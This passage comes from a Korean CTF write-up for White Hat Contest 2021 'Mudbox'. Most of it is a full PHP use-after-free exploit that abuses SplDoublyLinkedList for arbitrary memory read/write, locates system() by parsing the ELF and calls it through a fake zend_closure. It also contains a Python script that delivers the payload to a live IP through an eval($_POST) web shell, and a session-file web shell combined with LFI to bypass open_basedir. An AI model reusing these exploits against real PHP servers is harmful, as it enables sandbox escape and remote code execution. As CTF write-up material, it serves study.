</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">i2s</span>($data, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i2s</span>($data, <span style="color:#ae81ff">0x68</span>, $system_addr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Push our string, which contains a fake zend_closure, in the last freed chunk that
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e"># we control, and make the second zval point to it.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $rw_dll<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">push</span>($data);
</span></span><span style="display:flex;"><span>        $fake_zend_closure <span style="color:#f92672">=</span> <span style="color:#a6e22e">s2i</span>($fake_dll_element, $leaked_str_offsets[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">i2s</span>($fake_dll_element, $leaked_str_offsets[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>, $fake_zend_closure);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Replaced zend_closure by the fake one: 0x&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">dechex</span>($fake_zend_closure) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Calling it now
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Running system(&#34;cat /flag&#34;);&#39;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        $rw_dll[<span style="color:#ae81ff">1</span>](<span style="color:#e6db74">&#39;cat /flag&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">print_r</span>(<span style="color:#e6db74">&#39;DONE&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DanglingTrigger</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct($i)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> $i;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> $dlls;
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#D print(&#39;__destruct: &#39; . $this-&gt;i . &#34;\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $dlls[$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">i</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">offsetUnset</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        $dlls[$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">push</span>(<span style="color:#ae81ff">123</span>);
</span></span><span style="display:flex;"><span>        $dlls[$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">offsetUnset</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SystemExecutor</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">ArrayObject</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">offsetGet</span>($x)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">offsetGet</span>($x);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * and setting its type to zend_string, so that zend_string-&gt;len points to the value
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * we want to read.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>($addr, $s<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> $fake_dll_element, $leaked_str_offsets, $rw_dll;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i2s</span>($fake_dll_element, $leaked_str_offsets[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>, $addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i2s</span>($fake_dll_element, $leaked_str_offsets[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00000006</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $value <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($rw_dll[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($s <span style="color:#f92672">!=</span> <span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>        $value <span style="color:#f92672">&amp;=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> ($s <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $value;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_binary_base</span>($binary_leak)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    $start <span style="color:#f92672">=</span> $binary_leak <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000</span>; $i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $addr <span style="color:#f92672">=</span> $start <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">*</span> $i;
</span></span><span style="display:flex;"><span>        $leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($addr, <span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ELF header
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>($leak <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10102464c457f</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> $addr;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We&#39;ll crash before this but it&#39;s clearer this way
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Exploit failed: Unable to find ELF header&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parse_elf</span>($base)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $e_type <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $e_phoff <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>);
</span></span><span style="display:flex;"><span>    $e_phentsize <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    $e_phnum <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $e_phnum; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        $header <span style="color:#f92672">=</span> $base <span style="color:#f92672">+</span> $e_phoff <span style="color:#f92672">+</span> $i <span style="color:#f92672">*</span> $e_phentsize;
</span></span><span style="display:flex;"><span>        $p_type  <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($header <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>        $p_flags <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($header <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>        $p_vaddr <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($header <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>        $p_memsz <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($header <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($p_type <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> $p_flags <span style="color:#f92672">==</span> <span style="color:#ae81ff">6</span>) { <span style="color:#75715e"># PT_LOAD, PF_Read_Write
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e"># handle pie
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $data_addr <span style="color:#f92672">=</span> $e_type <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">?</span> $p_vaddr <span style="color:#f92672">:</span> $base <span style="color:#f92672">+</span> $p_vaddr;
</span></span><span style="display:flex;"><span>            $data_size <span style="color:#f92672">=</span> $p_memsz;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($p_type <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> $p_flags <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) { <span style="color:#75715e"># PT_LOAD, PF_Read_exec
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $text_size <span style="color:#f92672">=</span> $p_memsz;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$data_addr <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>$text_size <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>$data_size)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Exploit failed: Unable to parse ELF&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> [$data_addr, $text_size, $data_size];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_basic_funcs</span>($base, $elf) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">list</span>($data_addr, $text_size, $data_size) <span style="color:#f92672">=</span> $elf;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $data_size <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        $leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($data_addr <span style="color:#f92672">+</span> $i <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($leak <span style="color:#f92672">-</span> $base <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> $leak <span style="color:#f92672">&lt;</span> $data_addr) {
</span></span><span style="display:flex;"><span>            $deref <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($leak);
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># &#39;constant&#39; constant check
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span>($deref <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x746e6174736e6f63</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($data_addr <span style="color:#f92672">+</span> ($i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($leak <span style="color:#f92672">-</span> $base <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> $leak <span style="color:#f92672">&lt;</span> $data_addr) {
</span></span><span style="display:flex;"><span>            $deref <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($leak);
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># &#39;bin2hex&#39; constant check
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span>($deref <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x786568326e6962</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $data_addr <span style="color:#f92672">+</span> $i <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_system</span>($basic_funcs)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $addr <span style="color:#f92672">=</span> $basic_funcs;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>        $f_entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($addr);
</span></span><span style="display:flex;"><span>        $f_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>($f_entry, <span style="color:#ae81ff">6</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($f_name <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6d6574737973</span>) { <span style="color:#75715e"># system
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">read</span>($addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $addr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span>($f_entry <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_system_address</span>($binary_leak)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $base <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_binary_base</span>($binary_leak);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;ELF base: 0x&#39;</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">dechex</span>($base) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    $elf <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_elf</span>($base);
</span></span><span style="display:flex;"><span>    $basic_funcs <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_basic_funcs</span>($base, $elf);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Basic functions: 0x&#39;</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">dechex</span>($basic_funcs) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    $zif_system <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_system</span>($basic_funcs);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $zif_system;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$dlls <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>$strs <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>$rw_dll <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SplDoublyLinkedList</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a chain of dangling triggers, which will all in turn
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># free current-&gt;next, push an element to the next list, and free current
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># This will make sure that every current-&gt;next points the same memory block,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># which we will UAF.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">NB_DANGLING</span>; $i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $dlls[$i] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SplDoublyLinkedList</span>();
</span></span><span style="display:flex;"><span>    $dlls[$i]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">push</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DanglingTrigger</span>($i));
</span></span><span style="display:flex;"><span>    $dlls[$i]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rewind</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># We want our UAF&#39;d list element to be before two strings, so that we can
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># obtain the address of the first string, and increase is size. We then have
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># R/W over all memory after the obtained address.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;NB_STRS&#39;</span>, <span style="color:#ae81ff">50</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">NB_STRS</span>; $i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $strs[] <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_shuffle</span>(<span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#a6e22e">SIZE_ELEM_STR</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i2s</span>($strs[$i], <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">STR_MARKER</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i2s</span>($strs[$i], <span style="color:#ae81ff">8</span>, $i, <span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Free one string in the middle, ...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$strs[<span style="color:#a6e22e">NB_STRS</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">123</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ... and put the to-be-UAF&#39;d list element instead.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$dlls[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">push</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setup the last DLlist, which will exploit the UAF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$dlls[<span style="color:#a6e22e">NB_DANGLING</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SplDoublyLinkedList</span>();
</span></span><span style="display:flex;"><span>$dlls[<span style="color:#a6e22e">NB_DANGLING</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">push</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">UAFTrigger</span>());
</span></span><span style="display:flex;"><span>$dlls[<span style="color:#a6e22e">NB_DANGLING</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rewind</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger the bug on the first list
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$dlls[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">offsetUnset</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">die</span>();
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;payload&#39;</span>: open(<span style="color:#e6db74">&#39;uaf.php&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&lt;?php&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://3.38.109.135:28344/data/bf233c59229bbbbe50aa44971fbb17c2/40977f3b892bcbc3edd5fd4f1d3abe38.pht?code=eval($_POST[&#39;payload&#39;]);&#34;</span>, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/flag.png?raw=true" alt=""></p>
<p>위 poc 코드를 실행 시켜주면 UAF Sandbox Escape 공격으로 플래그를 읽어오는 것을 볼 수 있습니다.</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">session_save_path</span>()<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mkdir</span>(<span style="color:#e6db74">&#34;a&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mkdir</span>(<span style="color:#e6db74">&#34;a/b&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;a/b/&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_save_path</span>(<span style="color:#e6db74">&#34;../../plugin&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;../..&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span>$_SESSION[<span style="color:#e6db74">&#39;test&#39;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;?php include(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/flag</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">); ?&gt;&#34;</span>;
</span></span></code></pre></div><p>두 번째 , open_basedir 우회하는 방식은 <code>session_save_path()</code> 함수를 이용해서 세션 파일을 원하는 곳에 생성 시켜 우회하는 방식입니다. 일단 위 페이로드를 이용해서 &lsquo;plugin/&rsquo; 디렉터리에 세션 파일로 웹쉘을 생성을 합니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$p <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;p&#34;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#34;about&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/[^A-Za-z0-9\-_]/&#34;</span>, $p))
</span></span><span style="display:flex;"><span>    $p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;about&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;./</span><span style="color:#e6db74">$p</span><span style="color:#e6db74">&#34;</span>;
</span></span></code></pre></div><p><code>/plugin</code>에 인덱스 파일을 보면 입력값에 문자열 및 &lsquo;-&rsquo;, &lsquo;_&rsquo; 문자열만 포함되어 있어야 하고, include를 이용해서 입력값에 대한 파일을 가져오는 것을 알 수 있습니다. 그렇기 때문에 위에서 올린 세션 파일을 LFI를 이용해 가져와 실행 시키면 플래그를 획득할 수 있습니다. 세션 파일명은 <code>(sess_phpsessid)</code> 입니다.</p>
